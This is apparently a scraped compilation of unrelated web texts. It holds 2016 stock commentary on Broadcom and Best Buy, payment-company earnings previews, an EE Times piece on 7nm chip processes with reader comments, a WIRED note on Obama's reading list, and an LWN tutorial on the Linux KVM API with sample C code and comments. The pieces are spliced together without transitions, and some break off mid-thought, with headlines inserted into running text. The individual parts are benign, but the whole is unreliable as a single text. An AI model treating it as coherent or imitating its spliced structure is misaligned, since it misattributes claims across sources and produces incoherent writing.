Broadcom is levered to growth in the areas of advanced wireless technologies, smartphones, data center spending, IP traffic and the internet of things. These areas are expected to grow at strong double-digit compounded annual growth rates over the next several years. As the uses of wireless technologies continue to multiply, Broadcom's sophisticated FBAR (Film Bulk Acoustic Resonator) filters ensure wireless devices capture the right signal for the right device. Consumers and corporations are upgrading to faster and more data intensive computer hardware, and this new hardware will be embedded with the latest communication semiconductor chips from suppliers like Broadcom. It is also important to note that Apple represents 20 percent of Broadcom's revenue, and competitors, such as Qualcomm (QCOM), Skyworks Solutions (SWKS) and Qorvo (QRVO) aggressively vie for this business.  Post-merger, Broadcom carries $15 billion of debt versus $2 billion of cash. However, this debt load is manageable given the company is expected to generate almost $5 billion of free cash flow in 2017, of which only $900 million will be used to fund the dividend. At 12.5 times estimated calendar year 2017 earnings, Broadcom offers an attractive valuation: a 1.1 percent dividend yield and an estimated long-term earnings growth rate of 15 percent. As for how technology-related devices are purchased, given the rapid growth of online retailers, many investors have written off traditional brick-and-mortar retailers. However, Best Buy trades at 12 times estimated calendar year 2017 earnings versus 78 times for online retailer Amazon.com (AMZN). Investors are ignoring several important trends, as domestic sales have turned the corner and have grown for the last several quarters. Best Buy's domestic online portion grew 24 percent last quarter and now represents 10.6 percent of U.S. sales. Expenses are expected to grow at a slower rate as the company transitions to more online sales. This offers the potential for margin expansion over time. Since faster data speeds enable higher quality video, consumers are more likely to visit showrooms and consult with employees as to which TV stand or audio technology will complement their home theater experience. Some customers may also hire Best Buy to install sophisticated technology or purchase an extended warranty. Best Buy is estimated to generate $1 billion of free cash flow next year. An estimated $500 million will be returned to shareholders in the form of a dividend and $300 million will used to repurchase stock. Best Buy currently yields 2.8 percent and long-term earnings are estimated to grow 11 percent per year. In the past 10 years, the company has repurchased 33 percent of its shares outstanding. Technology has impacted much of the world, and the financial industry is no different – companies in this sector are seeing the effects firsthand, as investors look to find profit.  Disclosure: Leslie Thompson and clients of Spectrum Management Group own AVGO, BBY, AAPL, MSFT, CSCO and FB.

It should be noted that, while higher than expected, revenue was the lowest reported in more than five years, largely due to a loss of a Costco Wholesale Corporation (NASDAQ: COST) contract, which had accounted for roughly 8 percent of all money spent using AmEx cards in 2015. Next week, Visa Inc (NYSE: V), Mastercard Inc (NYSE: MA), Capital One Financial Corp. (NYSE: COF) and Discover Financial Services (NYSE: DFS) will report their quarterly financial results. Barclays Expects PayPal To Continue To Take Market Share In P2P, Money Transfer And E-Commerce Will they be able to deliver better than expected performance, same as American Express did? Let’s take a look at what the Street has in mind. Voices From The Street Visa will report its Q4 results on Monday afternoon, and analysts are modeling EPS of $0.73 on revenue of $4.241 billion, up from $0.62 and $3.571 in the same quarter last year. The Vetr crowd has a 3.5 Stars (Buy) rating on shares of Visa. Its average price target of $87.75 implies a potential return of 6.8 percent from current valuations. MasterCard’s report is scheduled for Friday morning, and the Street envisions Q3 EPS of $0.98 on revenue of $2.735, versus $0.91 and $2.53 billion seen a year ago. The Vetr crowd maintains a 3.5 Stars (Buy) rating on shares of MasterCard. Its average price target of $110.07 implies a potential return of 6.8 percent from current valuations. Finally, there’s Capital One Financial Corp. and Discover Financial, which will announce their results on Tuesday. For the former, Wall Street is anticipating EPS of $1.94 on revenue of $6.355 billion, versus EPS of $2.10 on revenue of $5.9 billion registered in the same quarter last year. Lastly, analysts believe that Discover Financial will post EPS of $1.48 on revenue of $2.28 billion, up from $1.38 and $2.188 billion delivered in the same period a year ago.

Visa, MasterCard, PayPal Stocks Suffer Ugly Losses; American Express, Discover Fly (Investor's Business Daily) Despite increasing competition from Venmo and others, Barclays expects Paypal Holdings Inc(NASDAQ: PYPL) to continue to take market share across P2P, money transfer and e-commerce going forward. Shares of PayPal were soaring in Friday's session, up over 9.5 percent at time of writing. Barclays highlighted PayPal's first mover advantage, brand awareness and best–in-class position in each channel as key catalysts for continued market penetration. Analysts are expecting mid- to high-teens EPS growth over the next three years with even more potential from possible buybacks and M&A activity. Medium Term Top-Line Guidance PayPal provided its FY17 and three-year outlook and is looking for revenue growth in FY17 to come in around 16–17 percent. Operating margins are expected to be flat, as some revenue and cost initiatives will be offset by incremental expense related to customer choice initiatives.

News & Analysis TSMC, GF/Samsung Battle at 7nm Intel may take back seat to foundries Rick Merritt 10/21/2016 01:09 PM EDT 53 comments NO RATINGS Login to Rate Tweet SAN JOSE, Calif. — TSMC will go head-to-head with the partnership of IBM, Globalfoundries and Samsung to publicly detail rival 7nm processes at a technical conference in December. The trio’s process will use extreme ultraviolet lithography to achieve impressive gains, but TSMC likely will get to market first due to challenges getting EUV into production. Using EUV, GF and Samsung claim they will deliver “the tightest contacted polysilicon pitch (44/48nm) and metallization pitch (36nm) ever reported for FinFETs,” in an abstract for the International Electron Devices Meeting (IEDM). The pitches leapfrog the 56nm gate pitch Intel announced in August for its 10nm process, claiming industry-leading density for the node it aims to have in production next year. Observers have started to suggest both TSMC and Samsung might leapfrog Intel which has slowed the pace of releasing new process technologies as progress in Moore’s law becomes more complex and costly. For its part, TSMC will describe at IEDM a 0.027µm2 SRAM test cell made in its 7nm process using immersion steppers. The 256-Mbit, six-transistor SRAM has the smallest cell size reported to date, TSMC claimed, and sports “full read/write functionality down to 0.5V,” it added. The abstract echoed claims for the 7nm node that TSMC first made at an event here in September. The process will deliver “more than three times the gate density and either a speed gain (35-40%) or power reduction (>65%) versus the company’s commercial 16nm FinFET process,” the abstract said. IEDM is clearly the coming out party for 7nm, said G. Dan Hutcheson, president of VLSI Research. The key message is Moores law is not stopping because customers are moving to 7nm," he said. On Monday when Samsung announced its 10nm process, it said it would skip a version of 7nm using today’s immersion lithography. Instead it said it will roll out 7nm with EUV targeting production before the end of 2018. For its part, TSMC said it will have at least limited production in 2017 for its 7nm process with immersion steppers. The net result is in the course of 18 months chip designers will see at least three variants of 7nm -- separate immersion variants from TSMC and Globalfoundries and the EUV version from GF/Samsung. Intel has yet to detail its 7nm node, but said it expects density to rise and cost per transistor to fall. To speed signaling, the GF/Samsung 7nm process will use “dual-strained channels on a thick strain-relaxed buffer virtual substrate to combine tensile-strained NMOS and compressively strained SiGe PMOS for enhancement of drive current by 11% and 20%, respectively,” its abstract said. The approach uses a “novel trench epitaxy to minimize the resistance of the highly scaled contact regions,” it added. In September, GF said it developed its own 7nm process using immersion steppers that will be in production in 2018. It did not mention it was still collaborating with Samsung on the EUV version. The 7nm immersion process will have a logic density of 17 million gates/mm2, a spokeswoman said. The TSMC 7nm process uses “a raised source/drain epitaxial process that strains the transistor channel and reduces parasitics, a novel contact process, and a copper/low-k interconnect scheme featuring different metal pitches and stacks,” the abstract said.

The uniqueness of 7nm is that 7nm at the bottom and 4nm at the top is so narrow that the entire channel is fully inverted as seen in a double gate transistor, resulting in large drive currents. Therefore, implementation of III-V or Ge channel is unnecessary or even detrimental because it dose not provide higher transistor drive currents than the fully inverted channel that I talk about here.

I had the (apparently wrong) impression that TSMC 10nm was already close to Samsung 10nm. There were no official revelations of course, just some web speculations, and also my assumption that Samsung and TSMC 10nm were somewhat comparable in gross design rules.

With any process the minimum pitch is a tradeoff between yield and density, but is also linked to other factors like fin spacing, size/spacing/resistance of contacts to gate/source/metal, and restrictive design rules with colouring -- even though 38nm may be a manufacturable metal pitch, it may not be usable in actual layouts for other reasons, or may end up increasing cost or reducing performance. It's the difference between what can be done in the lab (and published in a paper) and what is the best solution for real chips... [note that Intel increased pitches for their 14nm v2 process, which suggests they pushed them down too hard for v1 where it's well known they had yield problems] Reply   Post Message   Messages List   Start a Board User Rank CEO Re: I Already Covered this with Density Comparisons realjjj   10/25/2016 5:58:43 PM NO RATINGS Login to Rate They likely include fin height and standard cells heights in the math to determine where they get the best cost and perf. With 14nm Plus they increase gate pitch and fin height (and who knows what else), likely smaller cells to keep overall transistor density and reached a claimed 12% perf gain. Chances are yields are better too. Reply   Post Message   Messages List   Start a Board User Rank Author Re: I Already Covered this with Density Comparisons ScottenJ   10/25/2016 5:42:57 PM NO RATINGS Login to Rate Thanks I think it depends on the process. Just my opinion, but even with restrictive design rules logic is still less regular than memory so maybe 40nm for logic but 38nm for memory. I know Intel at one point said 80nm was the single pattern limit and since SADP is pitch doubling that would imply 40nm. Beyond that I think you need SAQP and it is doable but expensive, particularly for metal layers with block masks where if you need more than one block mask the process gets really complicated.

But Obama, one of the great orators of modern politics, was influenced by great authors long before he got national security clearance. In our November issue, the president gave WIRED a crash course in the books that shaped him. Like all diligent overachievers, we take our homework seriously. So we calculated how much time you’d need to read everything on Professor Obama’s syllabus. You’re looking at 89 hours with great minds like Abraham Lincoln, James Baldwin, and Elizabeth Kolbert. Obama appreciates an excellent novel like John Steinbeck’s In Dubious Battle, but doesn’t shy away from hard-hitting nonfiction, like Yuval Noah Harari’s Sapiens: A Brief History of Humankind. And he’s got a soft spot for biographies of great American forces of change, from Andy Grove to Martin Luther King Jr. Of course, you could space that reading out over a manageable amount of time. But you also could work on your taxes for an hour a week and have them done by March. So next time you’ve got a week to spare, kick up your feet and cram for your freshman lit seminar in the Oval Office. There’s never been such a good excuse for avoiding conversation with extended family over the holidays; let the binge-reading begin! The Collected Works of Abraham Lincoln Yeah, Abe authored the Gettysburg Address—but he also wrote plenty beyond his speeches, including personal letters, pardons, and orders for war supplies.

If you appreciate our content, please buy a subscription and make the next set of articles possible. September 29, 2015 This article was contributed by Josh Triplett Many developers, users, and entire industries rely on virtualization, as provided by software like Xen, QEMU/KVM, or kvmtool. While QEMU can run a software-based virtual machine, and Xen can run cooperating paravirtualized OSes without hardware support, most current uses and deployments of virtualization rely on hardware-accelerated virtualization, as provided on many modern hardware platforms. Linux supports hardware virtualization via the Kernel Virtual Machine (KVM) API. In this article, we'll take a closer look at the KVM API, using it to directly set up a virtual machine without using any existing virtual machine implementation. A virtual machine using KVM need not run a complete operating system or emulate a full suite of hardware devices. Using the KVM API, a program can run code inside a sandbox and provide arbitrary virtual hardware interfaces to that sandbox. If you want to emulate anything other than standard hardware, or run anything other than a standard operating system, you'll need to work with the KVM API used by virtual machine implementations. As a demonstration that KVM can run more (or less) than just a complete operating system, we'll instead run a small handful of instructions that simply compute 2+2 and print the result to an emulated serial port. The KVM API provides an abstraction over the hardware-virtualization features of various platforms. However, any software making use of the KVM API still needs to handle certain machine-specific details, such as processor registers and expected hardware devices. For the purposes of this article, we'll set up an x86 virtual machine using Intel VT. For another platform, you'd need to handle different registers, different virtual hardware, and different expectations about memory layout and initial state. The Linux kernel includes documentation of the KVM API in Documentation/virtual/kvm/api.txt and other files in the Documentation/virtual/kvm/ directory. This article includes snippets of sample code from a fully functional sample program (MIT licensed). The program makes extensive use of the err() and errx() functions for error handling; however, the snippets quoted in the article only include non-trivial error handling. Definition of the sample virtual machine A full virtual machine using KVM typically emulates a variety of virtual hardware devices and firmware functionality, as well as a potentially complex initial state and initial memory contents. For our sample virtual machine, we'll run the following 16-bit x86 code: 
    mov $0x3f8, %dx
    add %bl, %al
    add $'0', %al
    out %al, (%dx)
    mov $'\n', %al
    out %al, (%dx)
    hlt
 These instructions will add the initial contents of the al and bl registers (which we will pre-initialize to 2), convert the resulting sum (4) to ASCII by adding '0', output it to a serial port at 0x3f8 followed by a newline, and then halt. Rather than reading code from an object file or executable, we'll pre-assemble these instructions (via gcc and objdump) into machine code stored in a static array: 
    const uint8_t code[] = {
	0xba, 0xf8, 0x03, /* mov $0x3f8, %dx */
	0x00, 0xd8,       /* add %bl, %al */
	0x04, '0',        /* add $'0', %al */
	0xee,             /* out %al, (%dx) */
	0xb0, '\n',       /* mov $'\n', %al */
	0xee,             /* out %al, (%dx) */
	0xf4,             /* hlt */
    };
 For our initial state, we will preload this code into the second page of guest "physical" memory (to avoid conflicting with a non-existent real-mode interrupt descriptor table at address 0). al and bl will contain 2, the code segment (cs) will have a base of 0, and the instruction pointer (ip) will point to the start of the second page at 0x1000. Rather than the extensive set of virtual hardware typically provided by a virtual machine, we'll emulate only a trivial serial port on port 0x3f8. Finally, note that running 16-bit real-mode code with hardware VT support requires a processor with "unrestricted guest" support. The original VT implementations only supported protected mode with paging enabled; emulators like QEMU thus had to handle virtualization in software until reaching a paged protected mode (typically after OS boot), then feed the virtual system state into KVM to start doing hardware emulation. However, processors from the "Westmere" generation and newer support "unrestricted guest" mode, which adds hardware support for emulating 16-bit real mode, "big real mode", and protected mode without paging. The Linux KVM subsystem has supported the "unrestricted guest" feature since Linux 2.6.32 in June 2009. Building a virtual machine First, we'll need to open /dev/kvm: 
    kvm = open("/dev/kvm", O_RDWR | O_CLOEXEC);
 We need read-write access to the device to set up a virtual machine, and all opens not explicitly intended for inheritance across exec should use O_CLOEXEC. Depending on your system, you likely have access to /dev/kvm either via a group named "kvm" or via an access control list (ACL) granting access to users logged in at the console. Before you use the KVM API, you should make sure you have a version you can work with. Early versions of KVM had an unstable API with an increasing version number, but the KVM_API_VERSION last changed to 12 with Linux 2.6.22 in April 2007, and got locked to that as a stable interface in 2.6.24; since then, KVM API changes occur only via backward-compatible extensions (like all other kernel APIs). So, your application should first confirm that it has version 12, via the KVM_GET_API_VERSION ioctl(): 
    ret = ioctl(kvm, KVM_GET_API_VERSION, NULL);
    if (ret == -1)
	err(1, "KVM_GET_API_VERSION");
    if (ret != 12)
	errx(1, "KVM_GET_API_VERSION %d, expected 12", ret);
 After checking the version, you may want to check for any extensions you use, using the KVM_CHECK_EXTENSION ioctl(). However, for extensions that add new ioctl() calls, you can generally just call the ioctl(), which will fail with an error (ENOTTY) if it does not exist. If we wanted to check for the one extension we use in this sample program, KVM_CAP_USER_MEM (required to set up guest memory via the KVM_SET_USER_MEMORY_REGION ioctl()), that check would look like this: 
    ret = ioctl(kvm, KVM_CHECK_EXTENSION, KVM_CAP_USER_MEMORY);
    if (ret == -1)
	err(1, "KVM_CHECK_EXTENSION");
    if (!ret)
	errx(1, "Required extension KVM_CAP_USER_MEM not available");
 Next, we need to create a virtual machine (VM), which represents everything associated with one emulated system, including memory and one or more CPUs. KVM gives us a handle to this VM in the form of a file descriptor: 
    vmfd = ioctl(kvm, KVM_CREATE_VM, (unsigned long)0);
 The VM will need some memory, which we provide in pages. This corresponds to the "physical" address space as seen by the VM. For performance, we wouldn't want to trap every memory access and emulate it by returning the corresponding data; instead, when a virtual CPU attempts to access memory, the hardware virtualization for that CPU will first try to satisfy that access via the memory pages we've configured. If that fails (due to the VM accessing a "physical" address without memory mapped to it), the kernel will then let the user of the KVM API handle the access, such as by emulating a memory-mapped I/O device or generating a fault. For our simple example, we'll allocate a single page of memory to hold our code, using mmap() directly to obtain page-aligned zero-initialized memory: 
    mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 We then need to copy our machine code into it: 
    memcpy(mem, code, sizeof(code));
 And finally tell the KVM virtual machine about its spacious new 4096-byte memory: 
    struct kvm_userspace_memory_region region = {
	.slot = 0,
	.guest_phys_addr = 0x1000,
	.memory_size = 0x1000,
	.userspace_addr = (uint64_t)mem,
    };
    ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &region);
 The slot field provides an integer index identifying each region of memory we hand to KVM; calling KVM_SET_USER_MEMORY_REGION again with the same slot will replace this mapping, while calling it with a new slot will create a separate mapping. guest_phys_addr specifies the base "physical" address as seen from the guest, and userspace_addr points to the backing memory in our process that we allocated with mmap(); note that these always use 64-bit values, even on 32-bit platforms. memory_size specifies how much memory to map: one page, 0x1000 bytes. Now that we have a VM, with memory containing code to run, we need to create a virtual CPU to run that code. A KVM virtual CPU represents the state of one emulated CPU, including processor registers and other execution state. Again, KVM gives us a handle to this VCPU in the form of a file descriptor: 
    vcpufd = ioctl(vmfd, KVM_CREATE_VCPU, (unsigned long)0);
 The 0 here represents a sequential virtual CPU index. A VM with multiple CPUs would assign a series of small identifiers here, from 0 to a system-specific limit (obtainable by checking the KVM_CAP_MAX_VCPUS capability with KVM_CHECK_EXTENSION). Each virtual CPU has an associated struct kvm_run data structure, used to communicate information about the CPU between the kernel and user space. In particular, whenever hardware virtualization stops (called a "vmexit"), such as to emulate some virtual hardware, the kvm_run structure will contain information about why it stopped. We map this structure into user space using mmap(), but first, we need to know how much memory to map, which KVM tells us with the KVM_GET_VCPU_MMAP_SIZE ioctl(): 
    mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, NULL);
 Note that the mmap size typically exceeds that of the kvm_run structure, as the kernel will also use that space to store other transient structures that kvm_run may point to. Now that we have the size, we can mmap() the kvm_run structure: 
    run = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, vcpufd, 0);
 The VCPU also includes the processor's register state, broken into two sets of registers: standard registers and "special" registers. These correspond to two architecture-specific data structures: struct kvm_regs and struct kvm_sregs, respectively. On x86, the standard registers include general-purpose registers, as well as the instruction pointer and flags; the "special" registers primarily include segment registers and control registers. Before we can run code, we need to set up the initial states of these sets of registers. Of the "special" registers, we only need to change the code segment (cs); its default state (along with the initial instruction pointer) points to the reset vector at 16 bytes below the top of memory, but we want cs to point to 0 instead. Each segment in kvm_sregs includes a full segment descriptor; we don't need to change the various flags or the limit, but we zero the base and selector fields which together determine what address in memory the segment points to. To avoid changing any of the other initial "special" register states, we read them out, change cs, and write them back: 
    ioctl(vcpufd, KVM_GET_SREGS, &sregs);
    sregs.cs.base = 0;
    sregs.cs.selector = 0;
    ioctl(vcpufd, KVM_SET_SREGS, &sregs);
 For the standard registers, we set most of them to 0, other than our initial instruction pointer (pointing to our code at 0x1000, relative to cs at 0), our addends (2 and 2), and the initial state of the flags (specified as 0x2 by the x86 architecture; starting the VM will fail with this not set): 
    struct kvm_regs regs = {
	.rip = 0x1000,
	.rax = 2,
	.rbx = 2,
	.rflags = 0x2,
    };
    ioctl(vcpufd, KVM_SET_REGS, &regs);
 With our VM and VCPU created, our memory mapped and initialized, and our initial register states set, we can now start running instructions with the VCPU, using the KVM_RUN ioctl(). That will return successfully each time virtualization stops, such as for us to emulate hardware, so we'll run it in a loop: 
    while (1) {
	ioctl(vcpufd, KVM_RUN, NULL);
	switch (run->exit_reason) {
	/* Handle exit */
	}
    }
 Note that KVM_RUN runs the VM in the context of the current thread and doesn't return until emulation stops. To run a multi-CPU VM, the user-space process must spawn multiple threads, and call KVM_RUN for different virtual CPUs in different threads. To handle the exit, we check run->exit_reason to see why we exited. This can contain any of several dozen exit reasons, which correspond to different branches of the union in kvm_run. For this simple VM, we'll just handle a few of them, and treat any other exit_reason as an error. We treat a hlt instruction as a sign that we're done, since we have nothing to ever wake us back up: 
	case KVM_EXIT_HLT:
	    puts("KVM_EXIT_HLT");
	    return 0;
 To let the virtualized code output its result, we emulate a serial port on I/O port 0x3f8. Fields in run->io indicate the direction (input or output), the size (1, 2, or 4), the port, and the number of values. To pass the actual data, the kernel uses a buffer mapped after the kvm_run structure, and run->io.data_offset provides the offset from the start of that mapping. 
	case KVM_EXIT_IO:
	    if (run->io.direction == KVM_EXIT_IO_OUT &&
		    run->io.size == 1 &&
		    run->io.port == 0x3f8 &&
		    run->io.count == 1)
		putchar(*(((char *)run) + run->io.data_offset));
	    else
		errx(1, "unhandled KVM_EXIT_IO");
	    break;
 To make it easier to debug the process of setting up and running the VM, we handle a few common kinds of errors. KVM_EXIT_FAIL_ENTRY, in particular, shows up often when changing the initial conditions of the VM; it indicates that the underlying hardware virtualization mechanism (VT in this case) can't start the VM because the initial conditions don't match its requirements. (Among other reasons, this error will occur if the flags register does not have bit 0x2 set, or if the initial values of the segment or task-switching registers fail various setup criteria.) The hardware_entry_failure_reason does not actually distinguish many of those cases, so an error of this type typically requires a careful read through the hardware documentation. 
	case KVM_EXIT_FAIL_ENTRY:
	    errx(1, "KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx",
		 (unsigned long long)run->fail_entry.hardware_entry_failure_reason);
 KVM_EXIT_INTERNAL_ERROR indicates an error from the Linux KVM subsystem rather than from the hardware. In particular, under various circumstances, the KVM subsystem will emulate one or more instructions in the kernel rather than via hardware, such as for performance reasons (to coalesce a series of vmexits for I/O). The run->internal.suberror value KVM_INTERNAL_ERROR_EMULATION indicates that the VM encountered an instruction it doesn't know how to emulate, which most commonly indicates an invalid instruction. 
	case KVM_EXIT_INTERNAL_ERROR:
	    errx(1, "KVM_EXIT_INTERNAL_ERROR: suberror = 0x%x",
	         run->internal.suberror);
 When we put all of this together into the sample code, build it, and run it, we get the following: 
    $ ./kvmtest
    4
    KVM_EXIT_HLT
 Success! We ran our machine code, which added 2+2, turned it into an ASCII 4, and wrote it to port 0x3f8. This caused the KVM_RUN ioctl() to stop with KVM_EXIT_IO, which we emulated by printing the 4. We then looped and re-entered KVM_RUN, which stops with KVM_EXIT_IO again for the \n. On the third and final loop, KVM_RUN stops with KVM_EXIT_HLT, so we print a message and quit. Additional KVM API features This sample virtual machine demonstrates the core of the KVM API, but ignores several other major areas that many non-trivial virtual machines will care about. Prospective implementers of memory-mapped I/O devices will want to look at the exit_reason KVM_EXIT_MMIO, as well as the KVM_CAP_COALESCED_MMIO extension to reduce vmexits, and the ioeventfd mechanism to process I/O asynchronously without a vmexit. For hardware interrupts, see the irqfd mechanism, using the KVM_CAP_IRQFD extension capability. This provides a file descriptor that can inject a hardware interrupt into the KVM virtual machine without stopping it first. A virtual machine may thus write to this from a separate event loop or device-handling thread, and threads running KVM_RUN for a virtual CPU will process that interrupt at the next available opportunity. x86 virtual machines will likely want to support CPUID and model-specific registers (MSRs), both of which have architecture-specific ioctl()s that minimize vmexits. Applications of the KVM API Other than learning, debugging a virtual machine implementation, or as a party trick, why use /dev/kvm directly? Virtual machines like qemu-kvm or kvmtool typically emulate the standard hardware of the target architecture; for instance, a standard x86 PC. While they can support other devices and virtio hardware, if you want to emulate a completely different type of system that shares little more than the instruction set architecture, you might want to implement a new VM instead. And even within an existing virtual machine implementation, authors of a new class of virtio hardware device will want a clear understanding of the KVM API. Efforts like novm and kvmtool use the KVM API to construct a lightweight VM, dedicated to running Linux rather than an arbitrary OS. More recently, the Clear Containers project uses kvmtool to run containers using hardware virtualization. Alternatively, a VM need not run an OS at all. A KVM-based VM could instead implement a hardware-assisted sandbox with no virtual hardware devices and no OS, providing arbitrary virtual "hardware" devices as the API between the sandbox and the sandboxing VM. While running a full virtual machine remains the primary use case for hardware virtualization, we've seen many innovative uses of the KVM API recently, and we can certainly expect more in the future. (Log in to post comments) Using the KVM API Posted Sep 29, 2015 18:30 UTC (Tue) by flewellyn (subscriber, #5047) [Link] Interesting and powerful tool, this KVM. The kernel API looks pretty low-level. I can see why something like libvirt would be needed to abstract it a bit. Using the KVM API Posted Sep 29, 2015 18:38 UTC (Tue) by luto (subscriber, #39314) [Link] Libvirt isn't really abstracting KVM -- it's abstracting QEMU, which uses KVM to implement something that looks like a real computer. Using the KVM API Posted Sep 29, 2015 18:45 UTC (Tue) by josh (subscriber, #17465) [Link] Right. Much of libvirt's configuration has to do with disk images, memory, network, and many other peripherals that depend on the VM implementation like qemu-kvm. Using the KVM API Posted Sep 29, 2015 19:15 UTC (Tue) by eru (subscriber, #2753) [Link] Wonder if it would be too much work to make dosemu use kvm? Originally dosemu was written to take advantage of the VM86 mode of 386, but this is not available on the x86_68 in 64-bit mode, so dosemu currently runs quite slowly there, because it falls back to software emulation. Using the KVM API Posted Sep 29, 2015 19:40 UTC (Tue) by josh (subscriber, #17465) [Link] Both dosemu and dosbox should be able to use the KVM API, as long as the system has "unrestricted guest" mode available to run real-mode code. Using the KVM API Posted Sep 29, 2015 21:18 UTC (Tue) by pbonzini (subscriber, #60935) [Link] Note that KVM used QEMU to handle the boot phase only in the very beginning; nowadays it uses vm86 mode or an in-kernel interpreter if unrestricted guest mode is unavailable. This avoids duplicating the emulation code between the kernel and userspace. Userspace doesn't know if you're running on a >=Westmere processor (or AMD, which has always had the equivalent of unrestricted mode--they called it "paged real mode"), or if you need to work around the limitations of the processor. But KVM is not really needed in this case: on one hand you don't need near bare-metal performance that KVM provides, because dosemu/dosbox only need to emulate a 100 MHz machine or so, and a simple interpreter or a JIT compiler like QEMU's can handle it (QEMU is known as slowish for a JIT translator, but there's some work being done on that side as well). On the other hand KVM's performance comes with some fine print, which you cannot really afford in the case of dosemu/dosbox. A KVM_EXIT_IO exit is very slow, on the order of a few thousand cycles on the newest processors. By comparison, QEMU can dispatch a single memory-mapped I/O operation in about 100 clock cycles, so 60-150 times faster than KVM. Hence running demos like Unreal (https://www.youtube.com/watch?v=VjYQeMExIwk#t=7m) doesn't work too well on QEMU with KVM because they do an insane number of such exits. To play old games (man, I should send those Jazz Jackrabbit patches upstream...) I typically use QEMU without KVM.

I have some interest in compiling out most or all of the in-kernel instruction emulation, to reduce attack surface area. > A KVM_EXIT_IO exit is very slow, on the order of a few thousand cycles on the newest processors.

With unrestricted_guest=1 you only exit to the emulator for a few privileged instructions (where for simplicity KVM emulates them instead of having a mini-interpreter in vmx.c/svm.c) and for I/O. But unfortunately, thanks to the x86 ISA's read-modify-write instructions that's still a _lot_ of different instructions that you can emulate. So there's not much that you can compile out. You could simply modify KVM to refuse loading if unrestricted_guest=0, but you can still trigger any bit of emulator code by setting up a race between two VCPUs. One triggers I/O continuously, the other races against the emulator changing the opcodes of the I/O instruction into something else. This actually used to be a vulnerability, but it's been patched for several years and the emulator is now considered a security sensitive component. > > A KVM_EXIT_IO exit is very slow, on the order of a few thousand cycles on the > > newest processors.

Still around 1500-2000 cycles. For ioeventfd you have to add the latency of waking up the I/O thread if it's sleeping (but if the fd is really busy, e.g. running fio in the guest, it won't have time to go to sleep). Using the KVM API Posted Sep 30, 2015 17:53 UTC (Wed) by josh (subscriber, #17465) [Link] > For ioeventfd you have to add the latency of waking up the I/O thread if it's sleeping (but if the fd is really busy, e.g. running fio in the guest, it won't have time to go to sleep). How much *minimum* latency comes from the vmexit, and how much gets added by the path from the in-kernel vmexit handling and whatever mechanism it uses to contact the I/O thread? If much of it comes from the latter, perhaps we could find a way to accelerate that via another (latency-optimized) interface. Using the KVM API Posted Oct 1, 2015 7:17 UTC (Thu) by pbonzini (subscriber, #60935) [Link] It's about 50-50. Using the KVM API Posted Oct 1, 2015 15:50 UTC (Thu) by josh (subscriber, #17465) [Link] Ouch. That really limits how much faster it can get, then, short of implementing the backend in the kernel. Using the KVM API Posted Oct 1, 2015 16:02 UTC (Thu) by pbonzini (subscriber, #60935) [Link] Even if you implement in the kernel, it's hard to bypass all the stuff that KVM does at vmexit. The processor doesn't restore the whole host state at vmexit time, but KVM must restore at least whatever is needed to run Linux (e.g. the %fs base to access per_cpu variables). Using the KVM API Posted Sep 30, 2015 3:42 UTC (Wed) by voltagex (subscriber, #86296) [Link] > (man, I should send those Jazz Jackrabbit patches upstream...) Yes, yes you should. By the way, can you still buy that game? That and OMF 2097 are my favourites of all time. Using the KVM API Posted Sep 30, 2015 13:46 UTC (Wed) by pbonzini (subscriber, #60935) [Link] I don't know, I play the shareware version. :) Using the KVM API Posted Sep 30, 2015 6:17 UTC (Wed) by eru (subscriber, #2753) [Link] on one hand you don't need near bare-metal performance that KVM provides, because dosemu/dosbox only need to emulate a 100 MHz machine or so, and a simple interpreter or a JIT compiler like QEMU's can handle it Probably true for old games, but the situation I am thinking of involves using ancient cross-compilers to compiler large masses of legacy code for a weird environment that still has to be maintained. One would think (and I did think) this is an I/O-bound operation, but it turned out the speed difference between dosemu with VM86 and dosemu on x86_86 with emulation is very noticeable (order of magnitude for large inputs). On the other hand, dosemu also has advantages, because it can run "headless", can easily access native files, and starts up quickly. These are important features, because the ancient compilers are wrapped in layers that hide their MS-DOS internals, so from the Linux user's point of view they act like normal command-line tools. Using the KVM API Posted Sep 30, 2015 13:46 UTC (Wed) by pbonzini (subscriber, #60935) [Link] What makes you use dosemu or dosbox instead of QEMU (with or without KVM)? Using the KVM API Posted Sep 30, 2015 15:28 UTC (Wed) by eru (subscriber, #2753) [Link] I probably should look into qemu again some day. One problem is file system access. As noted, I want the MS-DOS compilers to transparently compile sources in the Linux file system and write the objects there, and preferably without having to install any network support in the emulated MS-DOS or FreeDOS, so to leave maximum "real" memory for the compilers. Both dosemu and dosbox handle this requirement. Using the KVM API Posted Sep 30, 2015 17:15 UTC (Wed) by felix.s (guest, #104710) [Link] There's vvfat, but QEMU people say it's deprecated, and writing (which has to be manually enabled) currently seems broken. I found a virtio-9p driver for DOS: <http://www.zytor.com/pub/git/dos/virtio9p.git/>, but it's half-done, seems abandoned, and doesn't even compile properly as of now (binutils' fault though; bug 18963). On the other hand, the missing part is mostly the "boring" stuff, which is actually translating DOS file system accesses into 9P protocol exchanges (including file name translation). Maybe you can persuade hpa to get back to it :) Also, funnily enough, some time ago I've been working on a DOS/BIOS ABI layer based on KVM (I tried to make backends interchangeable, but I'm not sure how well I've succeeded), and I think it would be ideal for the use case you describe. I even managed to include a simplistic packet driver, so I can use the FDNPKG package manager to download programs to test. However, the code is currently such a mess that I'm too embarrassed to publish it. Maybe some day... Using the KVM API Posted Sep 30, 2015 17:34 UTC (Wed) by josh (subscriber, #17465) [Link] I've been thinking about using the KVM API to prototype a new virtio filesystem, both for simplicity (this shouldn't need a full network filesystem) and to improve on 9p's very high access latency. (Try building a kernel under virtio-9p, and compare to host performance building the same kernel.) 9p provides reasonable throughput, but not reasonable latency. Given the ability to map guest memory, file data access could occur by mmap()ing the file on the host and then handing that memory to the guest; however, that doesn't address the performance of calls like stat(), which need to run absurdly fast and absurdly often. Using the KVM API Posted Sep 30, 2015 17:49 UTC (Wed) by kvaneesh (subscriber, #45646) [Link] With cache=loose, we should used the cached value in the inode in getattr (v9fs_vfs_getattr_dotl). So stat should be fast. Using the KVM API Posted Oct 1, 2015 6:29 UTC (Thu) by kleptog (subscriber, #1183) [Link] I set up a system locally to run programs under a VM in qemu-kvm with shared folders and it was insanely slow, especially git and find. Stracing 